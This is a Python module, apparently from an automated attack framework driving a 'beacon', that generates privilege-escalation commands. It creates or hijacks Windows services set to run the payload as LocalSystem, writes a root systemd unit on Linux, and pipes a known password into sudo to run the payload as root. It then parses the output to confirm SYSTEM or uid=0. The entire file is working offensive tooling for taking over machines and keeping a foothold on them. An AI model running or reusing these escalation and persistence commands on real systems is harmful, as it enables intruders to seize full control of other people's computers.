"""
privesc.py — privilege escalation to SYSTEM / root.

The beacon commands: on Windows, create a service running as LocalSystem
that executes the beacon payload (classic SYSTEM escalation); on Linux,
install a root-owned systemd unit or sudo cron entry. Verification is
performed by the beacon reporting the effective identity (SYSTEM / uid=0).
"""

from __future__ import annotations

from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel


def system_escalation_command(os_name: str, payload: str) -> str:
    if "windows" in os_name.lower():
        return (f'sc create PhantomPriv binPath= "cmd /c {payload}" '
                f'start= auto obj= LocalSystem && sc start PhantomPriv && '
                f'whoami && echo PRIVESC_OK')
    return (f"printf '%s' '[Unit]\\nDescription=PhantomPriv\\n"
            f"[Service]\\nExecStart={payload}\\nUser=root\\n"
            f"[Install]\\nWantedBy=multi-user.target' "
            f"> /etc/systemd/system/phantom-priv.service && "
            f"systemctl start phantom-priv.service && "
            f"id && echo PRIVESC_OK")


def sudo_escalation_command(username: str, password: str, payload: str) -> str:
    """Linux: passwordless-or-known sudo -> run the beacon as root."""
    return (f"echo '{password}' | sudo -S -p '' bash -c '{payload}' "
            f"&& id && echo PRIVESC_OK")


def service_perms_escalation_command(payload: str) -> str:
    """Windows: service with weak permissions -> replace binPath with the
    beacon, started as LocalSystem."""
    return (f"sc config PhantomUpdate binPath= \"cmd /c {payload}\" "
            f"obj= LocalSystem start= auto && sc start PhantomUpdate && "
            f"sc qc PhantomUpdate && whoami && echo PRIVESC_OK")


def privesc_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """system_privilege is confirmed when the beacon's output proves the
    escalated identity (NT AUTHORITY\\SYSTEM or uid=0/root)."""
    evidence = output.strip()
    low = evidence.lower()
    is_system = ("system" in low and "PRIVESC_OK" in evidence)
    is_root = (("uid=0" in low or "root" in low)
               and "PRIVESC_OK" in evidence)
    if not (is_system or is_root):
        return []
    return [Finding(kind="system_privilege", key="escalated",
                    value={"identity": "SYSTEM" if is_system else "root",
                           "os": slots.get("os", "")},
                    confidence=0.9, source="privesc_system",
                    evidence=evidence[:200])]
